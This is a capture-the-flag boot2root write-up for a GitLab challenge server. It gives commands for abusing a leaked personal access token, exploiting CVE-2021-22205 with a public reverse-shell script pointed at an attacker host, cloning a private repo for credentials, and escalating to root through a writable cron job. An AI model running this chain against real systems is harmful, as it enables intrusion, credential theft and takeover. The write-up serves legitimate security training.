# Brief Solution

## Initial Foothold
1. Check public projects by browsing to `http://boot2root.ihack.sibersiaga.my/explore`, found ERMS repo with Personal Access Token leaked in gitlab.sh file owned by GitLab user `dev`. 
2. Abuse Personal Access Token to check for the GitLab version `curl --header "PRIVATE-TOKEN: Personal_Access_Token_Here" http://boot2root.ihack.sibersiaga.my/api/v4/version`
3. The return version is vulnerable to CVE-2021-22205, exploited to get OS-level privilege as `git` user onto the server.
4. Getting reverse shell with any [public exploit](https://github.com/faisalfs10x/GitLab-CVE-2021-22205-scanner/blob/main/GitLab-revshell.py) `python3 GitLab-revshell.py -u http://boot2root.ihack.sibersiaga.my -l AttackerIP -p AttackerPort`. Make sure to use your VPS as the AttackerIP so that it is reachable from the target server, or use Ngrok as an alternative.
## Low Priv User
1. Check private GitLab repo owned by GitLab user `dev` by abusing PRIVATE-TOKEN with `curl --header "PRIVATE-TOKEN: Personal_Access_Token_Here" http://boot2root.ihack.sibersiaga.my/api/v4/projects | jq`
2. Found private repo internal-dev-system. Git clone that private repo and discovered server credential of the `dev` user in the usertable.sql file. `git clone http://oauth2:Personal_Access_Token_Here@boot2root.ihack.sibersiaga.my/dev/internal-dev-system.git`
3. Escalate to the `dev` user onto the server with the discovered credential.
## Priv Escalation
1. Check for local privilege escalation vectors. Discovered that crontab is executing a `devscript.sh` script in /opt and it's running as root privilege for every 1 minute.
2. Read the `devscript.sh` script and found that `dev` user could write any python3 script in the `dev` home directory. 
3. Abusing the crontab by creating any python3 script such as executing `/bin/bash` as SUID or python3 reverse shell/backdoor.
